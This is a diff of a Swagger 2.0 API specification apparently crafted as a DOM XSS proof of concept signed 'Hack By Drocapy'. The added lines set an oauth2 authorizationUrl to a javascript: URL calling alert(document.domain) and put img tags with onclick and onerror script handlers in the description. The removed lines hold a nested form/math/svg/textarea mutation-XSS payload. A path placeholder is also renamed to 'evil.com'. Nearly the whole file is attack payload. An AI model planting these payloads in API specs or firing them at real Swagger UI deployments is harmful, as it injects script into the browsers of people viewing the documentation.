@@ -1,11 +1,12 @@
 swagger: '2.0'
 securityDefinitions:
   a:
+    type: oauth2
     authorizationUrl: javascript:alert(document.domain)//
 info:
   version: "1.0.0"
-  title: DOM XSS imge Test by Drocapy
-  description: Hack By Drocapy  ><img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onmouseover="alert(55)" onmouseover="alert(77)">
+  title: DOM XSS Hack Image & Javascript Code by Drocapy
+  description: Hack By Drocapy <img src=https://academy.avast.com/hubfs/New_Avast_Academy/Hackers/Hacker-Hero-a1.png onclick="alert(2)" onerror="alert(3)">
 paths:
   /Drocapy:
     get:
@@ -16,11 +17,11 @@ paths:
         - Drocapy
       operationId: find Accounts
       summary: Finds all accounts
-  '/hack/hachid/{id}':
+  '/hack/hachid/{evil.com}':
     delete:
       parameters:
         - description: 
-            <form><math><mtext></form><form><mglyph><svg><mtext><textarea><path id="</textarea>"><img onerror=alert(document.domain) src=1>"></form>
+            Successful response
           format: int64
           in: path
           name: id
